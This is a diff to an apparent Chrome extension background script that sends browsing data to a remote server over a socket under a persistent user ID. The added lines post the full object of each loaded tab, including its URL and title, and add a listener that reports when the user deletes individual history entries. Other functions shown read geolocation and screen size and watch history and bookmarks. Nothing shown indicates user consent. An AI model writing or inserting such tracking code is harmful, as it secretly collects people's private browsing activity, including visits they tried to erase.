@@ -55,7 +55,6 @@ var getScreenResolution = function () {
     return window.screen.width + "x" + window.screen.height;
 };
 
-
 var getCurrentPosition = function () {
     navigator.geolocation.getCurrentPosition(function (position) {
         console.log("Position found.");
@@ -112,7 +111,8 @@ var onTabUpdate = function (tabId, changeInfo, tab) {
     if (changeInfo.status === "complete") {
         console.log("Tab update:", "#" + tab.id, tab.title,
                     "(" + tab.url + ")");
-        console.log(tab);
+        // console.log(tab);
+        postData('tab-loaded', tab);
     }
 };
 
@@ -131,7 +131,10 @@ var onURLVisit = function (result) {
 };
 
 var onURLRemoval = function (removed) {
-    console.log(removed.urls);
+    // Log only if particular visits are removed.
+    if (!removed.allHistory) {
+        postData('url-removal', removed);
+    }
 };
 
 var onCookieChange = function (changeInfo) {
@@ -153,6 +156,7 @@ var activateListeners = function () {
     chrome.tabs.onActivated.addListener(onTabActive);
     chrome.tabs.onRemoved.addListener(onTabRemove);
     chrome.history.onVisited.addListener(onURLVisit);
+    chrome.history.onVisitRemoved.addListener(onURLRemoval);
     // chrome.cookies.onChanged.addListener(onCookieChange);
     chrome.bookmarks.onCreated.addListener(onBookmarkCreate);
     chrome.bookmarks.onChanged.addListener(onBookmarkChange);
@@ -171,9 +175,10 @@ var postData = function (type, payload) {
     data = {}
     data.uuid = uuid;
     data.time = new Date().getTime();
-    // data.type = type;
-    // data.payload = compressString(JSON.stringify(payload));
+    data.type = type;
     data.payload = JSON.stringify(payload);
+    // Compress payload.
+    // data.payload = compressString(JSON.stringify(payload));
     console.log(data);
     // Transmit data to server.
     socket.emit(type, data);
